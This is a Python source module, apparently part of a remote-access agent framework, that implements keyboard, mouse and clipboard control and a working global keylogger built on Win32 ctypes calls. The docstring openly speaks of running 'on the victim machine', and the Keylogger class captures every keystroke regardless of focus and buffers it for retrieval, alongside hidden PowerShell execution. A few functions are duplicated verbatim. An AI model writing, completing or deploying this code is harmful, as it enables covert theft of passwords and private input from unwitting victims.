"""
syspy/agent/inputs.py
=====================

Keyboard, mouse, clipboard and global keystroke-logging primitives.

Pure ctypes. No pywin32, no pynput, no pynput-style daemon threads, so this
module keeps working inside a frozen single-file build with nothing to install
on the victim machine.
"""

from __future__ import annotations

import ctypes
import os
import subprocess
import threading
import time

IS_WINDOWS = os.name == "nt"

__all__ = [
    "IS_WINDOWS",
    "Keylogger",
    "clipboard_get",
    "clipboard_set",
    "hotkey",
    "key_down",
    "key_press",
    "key_up",
    "mouse",
    "mouse_click",
    "mouse_double",
    "mouse_move",
    "mouse_scroll",
    "type_text",
    "vk_for",
]

# --------------------------------------------------------------------------- #
# Win32 bindings
# --------------------------------------------------------------------------- #

if IS_WINDOWS:
    from ctypes import wintypes

    user32 = ctypes.WinDLL("user32", use_last_error=True)
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

    ULONG_PTR = ctypes.c_void_p

    class MOUSEINPUT(ctypes.Structure):
        _fields_ = [
            ("dx", wintypes.LONG),
            ("dy", wintypes.LONG),
            ("mouseData", wintypes.DWORD),
            ("dwFlags", wintypes.DWORD),
            ("time", wintypes.DWORD),
            ("dwExtraInfo", ULONG_PTR),
        ]

    class KEYBDINPUT(ctypes.Structure):
        _fields_ = [
            ("wVk", wintypes.WORD),
            ("wScan", wintypes.WORD),
            ("dwFlags", wintypes.DWORD),
            ("time", wintypes.DWORD),
            ("dwExtraInfo", ULONG_PTR),
        ]

    class HARDWAREINPUT(ctypes.Structure):
        _fields_ = [
            ("uMsg", wintypes.DWORD),
            ("wParamL", wintypes.WORD),
            ("wParamH", wintypes.WORD),
        ]

    class _INPUTUNION(ctypes.Union):
        _fields_ = [("mi", MOUSEINPUT), ("ki", KEYBDINPUT), ("hi", HARDWAREINPUT)]

    class INPUT(ctypes.Structure):
        _fields_ = [("type", wintypes.DWORD), ("u", _INPUTUNION)]

    INPUT_KEYBOARD = 1
    KEYEVENTF_KEYUP = 0x0002
    KEYEVENTF_UNICODE = 0x0004

    MOUSEEVENTF_LEFTDOWN = 0x0002
    MOUSEEVENTF_LEFTUP = 0x0004
    MOUSEEVENTF_RIGHTDOWN = 0x0008
    MOUSEEVENTF_RIGHTUP = 0x0010
    MOUSEEVENTF_MIDDLEDOWN = 0x0020
    MOUSEEVENTF_MIDDLEUP = 0x0040
    MOUSEEVENTF_WHEEL = 0x0800

    CF_UNICODETEXT = 13
    GMEM_MOVEABLE = 0x0002

    user32.GetAsyncKeyState.argtypes = [ctypes.c_int]
    user32.GetAsyncKeyState.restype = ctypes.c_short
    user32.GetKeyboardState.argtypes = [ctypes.POINTER(ctypes.c_ubyte)]
    user32.GetKeyboardLayout.restype = wintypes.HKL
    user32.ToUnicodeEx.argtypes = [
        wintypes.UINT,
        wintypes.UINT,
        ctypes.POINTER(ctypes.c_ubyte),
        wintypes.LPWSTR,
        ctypes.c_int,
        wintypes.UINT,
        wintypes.HKL,
    ]
    user32.ToUnicodeEx.restype = ctypes.c_int
    user32.VkKeyScanW.argtypes = [wintypes.WCHAR]
    user32.VkKeyScanW.restype = ctypes.c_short
    user32.SetCursorPos.argtypes = [ctypes.c_int, ctypes.c_int]
    user32.GetClipboardData.restype = wintypes.HANDLE
    kernel32.GlobalLock.argtypes = [wintypes.HANDLE]
    kernel32.GlobalLock.restype = ctypes.c_void_p

# --------------------------------------------------------------------------- #
# Key-name translation
# --------------------------------------------------------------------------- #

VK_NAMES = {
    "backspace": 0x08, "back": 0x08, "tab": 0x09,
    "enter": 0x0D, "return": 0x0D,
    "shift": 0x10, "ctrl": 0x11, "control": 0x11, "alt": 0x12,
    "pause": 0x13, "capslock": 0x14,
    "esc": 0x1B, "escape": 0x1B, "space": 0x20,
    "pageup": 0x21, "pgup": 0x21, "pagedown": 0x22, "pgdn": 0x22,
    "end": 0x23, "home": 0x24,
    "left": 0x25, "up": 0x26, "right": 0x27, "down": 0x28,
    "insert": 0x2D, "ins": 0x2D, "delete": 0x2E, "del": 0x2E,
    "win": 0x5B, "lwin": 0x5B, "rwin": 0x5C, "apps": 0x5D, "menu": 0x5D,
    "numlock": 0x90, "scrolllock": 0x91,
    "lshift": 0xA0, "rshift": 0xA1,
    "lctrl": 0xA2, "rctrl": 0xA3,
    "lalt": 0xA4, "ralt": 0xA5,
    "multiply": 0x6A, "add": 0x6B, "subtract": 0x6D,
    "decimal": 0x6E, "divide": 0x6F,
    "printscreen": 0x2C, "prtsc": 0x2C,
}
for _i in range(10):
    VK_NAMES[f"num{_i}"] = 0x60 + _i
for _i in range(1, 25):
    VK_NAMES[f"f{_i}"] = 0x6F + _i


def vk_for(name) -> int:
    """Resolve ``'enter'``, ``'f5'`` or ``'a'`` to a virtual key code."""
    key = str(name).strip().lower()
    if not key:
        return 0
    if key in VK_NAMES:
        return VK_NAMES[key]
    if len(key) == 1:
        if IS_WINDOWS:
            code = user32.VkKeyScanW(key)
            if code != -1:
                return code & 0xFF
        return ord(key.upper())
    return 0


# --------------------------------------------------------------------------- #
# Keyboard
# --------------------------------------------------------------------------- #


def _send_keyboard(vk: int = 0, scan: int = 0, flags: int = 0) -> None:
    if not IS_WINDOWS:
        return
    entry = INPUT(type=INPUT_KEYBOARD)
    entry.u.ki = KEYBDINPUT(wVk=vk, wScan=scan, dwFlags=flags, time=0, dwExtraInfo=None)
    user32.SendInput(1, ctypes.byref(entry), ctypes.sizeof(INPUT))


def key_down(name) -> None:
    """Press a key and leave it held."""
    vk = vk_for(name)
    if vk:
        _send_keyboard(vk=vk, flags=0)


def key_up(name) -> None:
    """Release a previously held key."""
    vk = vk_for(name)
    if vk:
        _send_keyboard(vk=vk, flags=KEYEVENTF_KEYUP)


def key_press(name, repeat: int = 1) -> None:
    """Tap a key ``repeat`` times."""
    for _ in range(max(1, int(repeat))):
        key_down(name)
        key_up(name)


def hotkey(*names) -> None:
    """Chord several keys, e.g. ``hotkey('ctrl', 'shift', 'esc')``."""
    pressed = [n for n in names if vk_for(n)]
    for name in pressed:
        key_down(name)
    for name in reversed(pressed):
        key_up(name)


def type_text(text: str) -> None:
    """Type arbitrary unicode text via ``KEYEVENTF_UNICODE``."""
    if not IS_WINDOWS:
        return
    for char in str(text):
        code = ord(char)
        if char == "\n":
            key_press("enter")
            continue
        if char == "\t":
            key_press("tab")
            continue
        _send_keyboard(scan=code, flags=KEYEVENTF_UNICODE)
        _send_keyboard(scan=code, flags=KEYEVENTF_UNICODE | KEYEVENTF_KEYUP)
        time.sleep(0.002)


# --------------------------------------------------------------------------- #
# Mouse
# --------------------------------------------------------------------------- #

_BUTTONS = {
    "left": (MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP) if IS_WINDOWS else (0, 0),
    "right": (MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP) if IS_WINDOWS else (0, 0),
    "middle": (MOUSEEVENTF_MIDDLEDOWN, MOUSEEVENTF_MIDDLEUP) if IS_WINDOWS else (0, 0),
}


def mouse_move(x: int, y: int) -> None:
    """Move the pointer to absolute screen coordinates."""
    if IS_WINDOWS:
        user32.SetCursorPos(int(x), int(y))


def mouse_click(button: str = "left") -> None:
    """Single click at the current pointer position."""
    if not IS_WINDOWS:
        return
    down, up = _BUTTONS.get(str(button).lower(), _BUTTONS["left"])
    user32.mouse_event(down, 0, 0, 0, 0)
    user32.mouse_event(up, 0, 0, 0, 0)


def mouse_double(button: str = "left") -> None:
    """Double click."""
    mouse_click(button)
    time.sleep(0.05)
    mouse_click(button)


def mouse_scroll(amount: int) -> None:
    """Scroll the wheel; positive is up, negative is down."""
    if IS_WINDOWS:
        user32.mouse_event(MOUSEEVENTF_WHEEL, 0, 0, int(amount) * 120, 0)


def mouse(
    action: str = "click",
    x: int | None = None,
    y: int | None = None,
    button: str = "left",
    amount: int = 1,
) -> None:
    """One-call mouse dispatcher used by the ``mouse`` remote command.

    ``action`` is one of ``move``, ``click``, ``double``, ``scroll``.
    Coordinates are optional and applied first when supplied.
    """
    if x is not None and y is not None:
        mouse_move(x, y)
        time.sleep(0.03)

    action = str(action).lower()
    if action in ("move", "set", "position"):
        return
    if action in ("click", "press"):
        mouse_click(button)
    elif action in ("double", "dbl", "doubleclick"):
        mouse_double(button)
    elif action in ("scroll", "wheel"):
        mouse_scroll(amount)
    elif action in ("down", "hold"):
        if IS_WINDOWS:
            user32.mouse_event(_BUTTONS.get(button, _BUTTONS["left"])[0], 0, 0, 0, 0)
    elif action in ("up", "release"):
        if IS_WINDOWS:
            user32.mouse_event(_BUTTONS.get(button, _BUTTONS["left"])[1], 0, 0, 0, 0)


# --------------------------------------------------------------------------- #
# Clipboard
# --------------------------------------------------------------------------- #


def _powershell(script: str) -> str:
    """Run a short PowerShell snippet without flashing a console window."""
    flags = 0x08000000 if IS_WINDOWS else 0  # CREATE_NO_WINDOW
    try:
        proc = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", script],
            capture_output=True,
            creationflags=flags,
            timeout=10,
        )
    except (OSError, subprocess.SubprocessError):
        return ""
    return proc.stdout.decode("utf-8", "replace").strip()


def clipboard_get() -> str:
    """Return the clipboard as text, empty string if unreadable."""
    if not IS_WINDOWS:
        return ""
    for _ in range(5):
        if not user32.OpenClipboard(None):
            time.sleep(0.05)
            continue
        try:
            handle = user32.GetClipboardData(CF_UNICODETEXT)
            if not handle:
                return ""
            pointer = kernel32.GlobalLock(handle)
            if not pointer:
                return ""
            try:
                return ctypes.wstring_at(pointer)
            finally:
                kernel32.GlobalUnlock(handle)
        finally:
            user32.CloseClipboard()
    # Another process is squatting on the clipboard; let PowerShell have a go.
    return _powershell("Get-Clipboard -Raw")


def clipboard_set(text: str) -> bool:
    """Replace the clipboard contents. Returns True on success."""
    if not IS_WINDOWS:
        return False
    encoded = (str(text) + "\0").encode("utf-16-le")
    for _ in range(5):
        if not user32.OpenClipboard(None):
            time.sleep(0.05)
            continue
        try:
            user32.EmptyClipboard()
            handle = kernel32.GlobalAlloc(GMEM_MOVEABLE, len(encoded))
            if not handle:
                return False
            pointer = kernel32.GlobalLock(handle)
            ctypes.memmove(pointer, encoded, len(encoded))
            kernel32.GlobalUnlock(handle)
            user32.SetClipboardData(CF_UNICODETEXT, handle)
            return True
        finally:
            user32.CloseClipboard()
    return False


# --------------------------------------------------------------------------- #
# Keylogger
# --------------------------------------------------------------------------- #

def _pynput_available() -> bool:
    try:
        import pynput  # noqa: F401
        return True
    except Exception:
        return False


def _pynput_available() -> bool:
    try:
        import pynput  # noqa: F401
        return True
    except Exception:
        return False


_WATCHED_VKS = sorted(
    set(
        list(range(0x08, 0x0E))
        + list(range(0x10, 0x1C))
        + list(range(0x20, 0x2E))
        + list(range(0x30, 0x3A))
        + list(range(0x41, 0x5C))
        + list(range(0x60, 0x70))
        + list(range(0x70, 0x88))
        + list(range(0x90, 0x92))
        + list(range(0xA0, 0xA6))
        + list(range(0xBA, 0xC1))
        + list(range(0xDB, 0xDF))
    )
)


class Keylogger:
    """Global keystroke collector driven by ``GetAsyncKeyState`` polling.

    Polling rather than a ``WH_KEYBOARD_LL`` hook means no message pump and no
    thread affinity problems, and it captures keys regardless of which window
    has focus. Typical cost is one cheap Win32 call per watched key per tick.
    """

    def __init__(self, interval: float = 0.012, max_chars: int = 200_000) -> None:
        self.interval = max(0.005, float(interval))
        self.max_chars = max(1_000, int(max_chars))
        self._buffer: list[str] = []
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None

    # -- lifecycle --------------------------------------------------------- #

    @property
    def running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    def start(self) -> "Keylogger":
        if self.running:
            return self
        if not IS_WINDOWS and not _pynput_available():
            return self
        self._stop.clear()
        target = self._run if IS_WINDOWS else self._run_pynput
        self._thread = threading.Thread(target=target, daemon=True, name="syspy-keylog")
        self._thread.start()
        return self

    def _run_pynput(self) -> None:
        """Non-Windows backend. Optional: needs pynput, which is not a hard dep."""
        try:
            from pynput import keyboard
        except Exception:
            return

        def on_press(key) -> None:
            try:
                char = key.char
            except AttributeError:
                char = {
                    "Key.enter": "\n", "Key.tab": "\t", "Key.space": " ",
                    "Key.backspace": "[<]", "Key.esc": "[esc]",
                }.get(str(key), "")
            if char:
                self._emit_char(char)

        with keyboard.Listener(on_press=on_press) as listener:
            while not self._stop.is_set():
                time.sleep(0.1)
            listener.stop()

    def stop(self, timeout: float = 1.0) -> None:
        self._stop.set()
        if self._thread is not None:
            self._thread.join(timeout=timeout)
            self._thread = None

    def __enter__(self) -> "Keylogger":
        return self.start()

    def __exit__(self, *_exc) -> None:
        self.stop()

    # -- data -------------------------------------------------------------- #

    def snapshot(self) -> str:
        """Everything captured so far, without clearing."""
        with self._lock:
            return "".join(self._buffer)

    def drain(self) -> str:
        """Return everything captured so far and clear the buffer."""
        with self._lock:
            text = "".join(self._buffer)
            self._buffer.clear()
            return text

    def clear(self) -> None:
        with self._lock:
            self._buffer.clear()

    def __len__(self) -> int:
        with self._lock:
            return len(self._buffer)

    # -- internals --------------------------------------------------------- #

    def _run(self) -> None:
        pressed: set[int] = set()
        while not self._stop.is_set():
            for vk in _WATCHED_VKS:
                if user32.GetAsyncKeyState(vk) & 0x8000:
                    if vk not in pressed:
                        pressed.add(vk)
                        self._emit(vk)
                elif vk in pressed:
                    pressed.discard(vk)
            time.sleep(self.interval)

    def _emit_char(self, char: str) -> None:
        with self._lock:
            self._buffer.append(char)
            overflow = len(self._buffer) - self.max_chars
            if overflow > 0:
                del self._buffer[:overflow]

    def _emit_char(self, char: str) -> None:
        with self._lock:
            self._buffer.append(char)
            overflow = len(self._buffer) - self.max_chars
            if overflow > 0:
                del self._buffer[:overflow]

    def _emit(self, vk: int) -> None:
        char = self._translate(vk)
        if not char:
            return
        with self._lock:
            self._buffer.append(char)
            overflow = len(self._buffer) - self.max_chars
            if overflow > 0:
                del self._buffer[:overflow]

    @staticmethod
    def _translate(vk: int) -> str:
        """Turn a virtual key into the character the layout would produce."""
        if vk == 0x0D:
            return "\n"
        if vk == 0x08:
            return "[<]"
        if vk == 0x09:
            return "\t"
        if vk == 0x1B:
            return "[esc]"
        if vk in (0x10, 0x11, 0x12, 0x14, 0x90, 0x91) or 0xA0 <= vk <= 0xA5:
            return ""  # modifiers carry no glyph of their own

        state = (ctypes.c_ubyte * 256)()
        if not user32.GetKeyboardState(state):
            return ""
        buf = ctypes.create_unicode_buffer(8)
        written = user32.ToUnicodeEx(
            vk, 0, state, buf, 8, 0, user32.GetKeyboardLayout(0)
        )
        if written > 0:
            return buf.value[:written]
        if written == -1:
            return ""  # dead key, the next keystroke supplies the glyph
        if 0x60 <= vk <= 0x69:
            return str(vk - 0x60)
        return ""